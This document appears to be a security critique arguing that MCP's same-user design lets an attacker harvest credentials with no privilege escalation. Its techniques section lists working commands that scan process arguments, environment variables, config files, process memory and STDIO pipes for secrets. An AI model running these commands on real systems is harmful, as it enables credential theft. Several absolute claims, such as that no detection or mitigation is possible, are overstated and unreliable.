# The "No Privilege Escalation Required" Attack: Trivial Credential Harvesting

## The Most Dangerous Attack is the Simplest One

> "Why break in when you're already inside?"

### Executive Summary

MCP's same-user architecture creates a catastrophic security vulnerability where **NO privilege escalation is required** for total compromise. This document details why this makes MCP fundamentally unsuitable for any enterprise deployment.

## Why This Attack is Undetectable

### No Detection Because:

1. **No privilege escalation occurred** - Everything happens at the same privilege level
2. **All access appears "legitimate"** - Same user accessing their own processes
3. **Standard monitoring misses same-user lateral movement** - Security tools expect cross-user attacks
4. **MCP traffic looks like normal AI operations** - JSON-RPC over STDIO is invisible to network monitoring

### Traditional Attack Chain vs MCP Attack
```
Traditional:
Network Entry → Privilege Escalation → Lateral Movement → Credential Theft → Data Exfiltration
     ↓               ↓                      ↓                    ↓                 ↓
  Detected       Detected              Detected            Detected          Detected

MCP Attack:
User Compromise → Immediate Total Access
     ↓                    ↓
  Maybe Detected      NEVER DETECTED
```

## The Credential Explosion Problem

### What Lives in Every MCP Server

Most enterprises don't realize that every MCP server typically contains:

```yaml
Database Servers:
  - Direct connection strings: "postgresql://admin:Pr0d@123@db.internal/customers"
  - Backup credentials: "mongodb://backup:B@ckup2024@mongo.internal/archive"
  - Analytics access: "clickhouse://analyst:An@lyt1cs@analytics.internal/events"

API Integrations:
  - Payment processors: "stripe_sk_live_4242424242424242"
  - Communication APIs: "twilio_auth_token_abcdef123456"
  - Cloud services: "aws_secret_key_abcdefghijklmnop"

Internal Services:
  - LDAP bind passwords: "cn=admin,dc=company,dc=com:S3cur3P@ss"
  - Service mesh tokens: "consul_token_uuid-1234-5678"
  - Message queue credentials: "amqp://rabbitmq:Qu3u3P@ss@mq.internal"

File Access:
  - Paths to sensitive documents: "/mnt/shares/finance/Q4-results.xlsx"
  - SSH key locations: "/home/alice/.ssh/production_deploy_key"
  - Certificate paths: "/etc/pki/tls/private/wildcard.key"
```

**All stored in plaintext in process arguments or config files, all accessible to the same user.**

## Trivial Credential Harvesting Techniques

### 1. Process Argument Scanning
```bash
# 10 seconds to dump all credentials
ps aux | grep -E '(password|token|key|secret|://)' 

# Real example output:
alice 1234 python mcp-db.py postgresql://admin:Pr0d@123@db.internal/customers
alice 1235 node mcp-stripe.js --api-key=sk_live_4242424242424242
alice 1236 mcp-aws --secret-key=wJalrXUtnFEMI/K7MDENG/bPxRfiCY
```

### 2. Environment Variable Harvesting
```bash
# Iterate through all MCP processes
for pid in $(pgrep -u $USER mcp); do
    echo "=== Process $pid ==="
    cat /proc/$pid/environ | tr '\0' '\n' | grep -E '(TOKEN|KEY|PASS|SECRET)'
done

# Instant access to:
# - API tokens
# - OAuth secrets  
# - Service passwords
# - Encryption keys
```

### 3. Configuration File Raiding
```bash
# MCP servers often read configs
find ~ -name "*mcp*.json" -o -name "*mcp*.yaml" 2>/dev/null | \
while read config; do
    grep -E '(password|token|key|secret)' "$config"
done

# Also check:
~/.config/claude/
~/.mcp/
~/.*rc files
```

### 4. Memory Scraping
```bash
# No root needed - same user can access memory
gdb -p $(pgrep mcp-database) -batch \
    -ex "dump memory /tmp/mcp.dump 0x0 0xffffffff" \
    -ex "quit"

strings /tmp/mcp.dump | grep -A2 -B2 "password"
```

### 5. File Descriptor Interception
```bash
# MCP uses STDIO - we can read it
lsof -u $USER | grep -E '(pipe|FIFO)' | grep mcp

# Then read directly:
cat /proc/[PID]/fd/[FD_NUMBER]
```

## Why This Makes MCP Fundamentally Broken for Enterprise

### Violation of Basic Security Principles

#### 1. **Principle of Least Privilege** ❌
```
Expected: Each component has minimal necessary access
Reality:  Single user account has access to EVERYTHING
          - Database credentials
          - API keys  
          - File system
          - Memory of all processes
          - Network connections
```

#### 2. **Defense in Depth** ❌
```
Expected: Multiple security layers
          Network → Auth → Process → Data
          
Reality:  Single layer of security (user account)
          Compromise user = Bypass everything
```

#### 3. **Blast Radius Limitation** ❌
```
Expected: Compartmentalized damage
          DB breach ≠ File access
          API leak ≠ Source code theft
          
Reality:  Everything is in the same blast radius
          One breach = Total compromise
```

#### 4. **Separation of Duties** ❌
```
Expected: Different roles, different access
Reality:  One user plays all roles simultaneously
```

#### 5. **Auditing and Accountability** ❌
```
Expected: Clear audit trail of who did what
Reality:  Everything appears as one user's activity
```

## The Detection Problem

### Why Security Teams Miss This

#### Traditional Monitoring Assumes:
1. **Cross-user lateral movement triggers alerts**
   - MCP: Everything is same-user (no alerts)

2. **Privilege escalation is detectable**
   - MCP: No escalation needed (nothing to detect)

3. **Network connections are monitored**
   - MCP: Uses local STDIO pipes (invisible to network monitoring)

4. **Process creation is suspicious**
   - MCP: Legitimate AI tool usage (expected behavior)

5. **Credential access triggers warnings**
   - MCP: User reading own memory (allowed by design)

### What Security Tools Don't See

#### SIEM (Security Information and Event Management)
```log
Expected Alert: "User alice attempting privilege escalation"
Reality: [No alert - no escalation happening]

Expected Alert: "Suspicious cross-user file access"
Reality: [No alert - same user access]

Expected Alert: "Potential credential theft detected"
Reality: [No alert - legitimate process inspection]
```

#### EDR (Endpoint Detection and Response)
```yaml
Behavioral Analysis:
  - Process creation: Normal (developer activity)
  - File access: Normal (user's own files)
  - Memory access: Normal (debugging activity)
  - Network activity: Normal (local pipes)
  
Risk Score: 0/100 (Appears completely legitimate)
```

#### DLP (Data Loss Prevention)
```
Scanning for: Credit cards, SSNs, passwords leaving network
MCP Reality: Everything stays local (STDIO pipes)
Result: No detection
```

## Real-World Exploitation Timeline

```
T+0:00   - Initial compromise (phishing, malicious package, supply chain)
T+0:01   - Attacker runs: ps aux | grep mcp
T+0:02   - Credentials visible in process list
T+0:05   - Environment variables dumped
T+0:10   - Configuration files located
T+0:30   - All MCP server credentials harvested
T+1:00   - Database access achieved
T+5:00   - Full infrastructure mapped
T+10:00  - Persistent backdoors installed
T+30:00  - Data exfiltration complete

Detection: NONE (appears as normal user activity)
```

## The Compliance Nightmare

### Regulatory Violations

**PCI-DSS**: Cardholder data accessible via compromised MCP
**HIPAA**: Patient records exposed through same-user access  
**GDPR**: No data protection or access controls
**SOX**: Financial data integrity compromised
**ISO 27001**: Fundamental security controls absent

### Audit Findings
```
Critical: No privilege separation between systems
Critical: Credentials stored in plaintext
Critical: No access control enforcement
Critical: Audit trails meaningless (single user)
Critical: No defense against insider threats
```

## Why No Mitigation Works

### "Just use different users for each MCP server"
- Breaks STDIO communication model
- Requires SUID (worse security)
- Makes pipes world-readable
- Claude Desktop can't launch them

### "Put MCP in containers"
- Containers run as same UID outside
- Volume mounts expose everything
- No actual isolation gained
- Credentials still visible

### "Use secrets management"
- MCP doesn't support external secret stores
- Would require architectural redesign
- STDIO model prevents secure injection

### "Monitor for suspicious behavior"
- What's suspicious about `ps aux`?
- How do you detect `cat /proc/*/environ`?
- Everything looks legitimate

## The Brutal Truth

MCP's architecture makes it fundamentally incompatible with enterprise security requirements. The same-user model isn't a bug that can be patched - it's the core design that enables the "convenience" of MCP.

**For Enterprises**: Using MCP means accepting that any compromise equals total compromise, with no detection or mitigation possible.

**For Attackers**: MCP deployments are the easiest targets in the enterprise.

**For Security Teams**: You cannot secure what violates security by design.
